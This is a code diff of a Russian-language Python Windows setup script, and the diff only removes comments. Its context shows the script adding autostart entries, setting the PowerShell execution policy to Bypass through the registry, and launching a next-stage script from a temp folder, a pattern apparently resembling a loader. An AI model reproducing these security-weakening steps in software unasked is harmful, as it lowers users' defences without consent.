@@ -26,7 +26,7 @@ def main():
         copy_files(temp, main, adms, name)
         setup_autostart(name, temp)
         update_registry()
-        update_execution_policy()  # Добавлено редактирование реестра
+        update_execution_policy()
         run_next_script(temp, name)
     except Exception as e:
         print(f"Произошла ошибка: {e}")
@@ -62,7 +62,6 @@ def setup_7zip(adms):
     seven_zip_display_version = "24.09"
     seven_zip_download_version = "2409"
 
-    # Определение архитектуры ОС и выбор установщика
     try:
         os_architecture = subprocess.check_output(['wmic', 'os', 'get', 'osarchitecture']).decode('cp850').strip()
     except UnicodeDecodeError:
@@ -72,7 +71,6 @@ def setup_7zip(adms):
     seven_zip_install_path = os.path.join(adms, "7zip", seven_zip_installer)
     seven_zip_exe_path = r"C:\Program Files\7-Zip\7z.exe"
 
-    # Функция для получения установленной версии 7-Zip
     def get_installed_7zip_version():
         if os.path.exists(seven_zip_exe_path):
             try:
@@ -85,7 +83,6 @@ def setup_7zip(adms):
                 return None
         return None
 
-    # Проверка версии 7-Zip
     if os.path.exists(seven_zip_exe_path):
         installed_version = get_installed_7zip_version()
         if installed_version:
@@ -94,14 +91,12 @@ def setup_7zip(adms):
         else:
             print("Не удалось определить версию установленного 7-Zip.")
 
-        # Убедимся, что версии совпадают
         if installed_version == seven_zip_display_version.strip():
             print(f"7-Zip версии {seven_zip_display_version} уже установлен.")
             return
     else:
         print("7-Zip не установлен. Начинаем установку.")
 
-    # Если 7-Zip не установлен или версия не совпадает, скачиваем и устанавливаем
     if not os.path.exists(seven_zip_install_path):
         print("Загрузка 7-Zip...")
         os.makedirs(os.path.dirname(seven_zip_install_path), exist_ok=True)
@@ -175,7 +170,6 @@ def update_registry():
     except subprocess.CalledProcessError as e:
         print(f"Ошибка при обновлении реестра: {e}")
 
-# Функция для редактирования реестра для установки ExecutionPolicy в Bypass
 def update_execution_policy():
     try:
         reg_path = r"SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"
@@ -188,7 +182,7 @@ def update_execution_policy():
         logging.error(f"Ошибка при работе с реестром: {e}")
 
 def run_next_script(temp, name):
-    logging_script_path = os.path.join(temp, "loging.ps1")  # Исправлено на loging.ps1
+    logging_script_path = os.path.join(temp, "loging.ps1")
     try:
         print(f"Запуск следующей части скрипта: {logging_script_path}")
         logging.info(f"Запуск скрипта: {logging_script_path}")
